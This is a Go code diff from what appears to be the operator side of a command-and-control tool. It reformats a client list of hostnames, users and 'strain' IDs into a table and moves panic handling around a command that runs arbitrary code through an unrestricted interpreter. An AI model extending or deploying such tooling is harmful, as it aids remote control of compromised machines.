@@ -1,7 +1,6 @@
 package main
 
 import (
-	"encoding/json"
 	"fmt"
 	"reflect"
 	"strconv"
@@ -13,13 +12,7 @@ import (
 	"github.com/traefik/yaegi/stdlib/unsafe"
 )
 
-func CmdX(ctx lib.CommandContext, arg string) (response string, errResponse error) {
-	defer func() {
-		if p := recover(); p != nil {
-			errResponse = fmt.Errorf("command panicked: %e", p)
-		}
-	}()
-
+func CmdX(ctx lib.CommandContext, arg string) (string, error) {
 	i := interp.New(interp.Options{
 		Unrestricted: true,
 	})
@@ -64,8 +57,25 @@ func CmdL(ctx lib.CommandContext, arg string) (string, error) {
 	if err != nil {
 		return "", fmt.Errorf("could not get page from database: %e", err)
 	}
-	clientListString, _ := json.Marshal(clients)
-	return string(clientListString), nil
+	clientListString := fmt.Sprintf("Client list page %d:\n", page)
+	clientListString += "\n| Client ID | Strain ID | Init Time | Hostname | Host OS | Host Arch | HostUser | Host User ID | Modules | Errors |"
+	clientListString += "\n| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |"
+	for _, client := range clients {
+		clientListString += fmt.Sprintf(
+			"\n| %s | %s | %s | %s | %s | %s | %s | %s | %s | %d |",
+			client.ID,
+			client.LastHeartbeat.StrainId,
+			client.LastHeartbeat.InitTime,
+			client.LastHeartbeat.Hostname,
+			client.LastHeartbeat.HostOS,
+			client.LastHeartbeat.HostArch,
+			client.LastHeartbeat.HostUser,
+			client.LastHeartbeat.HostUserId,
+			client.LastHeartbeat.Modules,
+			client.LastHeartbeat.Errors,
+		)
+	}
+	return clientListString, nil
 }
 
 func CmdH(ctx lib.CommandContext, arg string) (string, error) {
@@ -77,7 +87,13 @@ func CmdH(ctx lib.CommandContext, arg string) (string, error) {
 	}
 }
 
-func ExecCmd(ctx lib.CommandContext, command string) (string, error) {
+func ExecCmd(ctx lib.CommandContext, command string) (response string, errResponse error) {
+	defer func() {
+		if p := recover(); p != nil {
+			errResponse = fmt.Errorf("command panicked: %e", p)
+		}
+	}()
+
 	keyword, arg, _ := strings.Cut(command, " ")
 	switch strings.ToLower(keyword) {
 	case "x":
